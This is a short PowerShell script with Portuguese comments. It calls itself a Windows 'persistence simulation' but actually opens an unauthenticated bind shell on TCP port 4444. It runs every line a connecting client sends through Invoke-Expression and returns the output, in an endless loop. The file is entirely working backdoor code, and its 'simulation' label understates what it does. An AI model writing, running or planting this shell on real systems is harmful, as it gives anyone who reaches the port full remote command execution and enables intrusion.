# Simulação de persistência para Windows
Write-Host "[PERSISTÊNCIA] Simulação de persistência executada"
# Bind shell PowerShell na porta 4444
$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
while ($true) {
	$client = $listener.AcceptTcpClient()
	$stream = $client.GetStream()
	$writer = New-Object System.IO.StreamWriter($stream)
	$reader = New-Object System.IO.StreamReader($stream)
	$writer.AutoFlush = $true
	while ($client.Connected) {
		$writer.Write("PS> ")
		$cmd = $reader.ReadLine()
		if ($cmd -eq "exit") { $client.Close(); break }
		try {
			$output = Invoke-Expression $cmd 2>&1 | Out-String
		} catch { $output = $_.Exception.Message }
		$writer.WriteLine($output)
	}
}
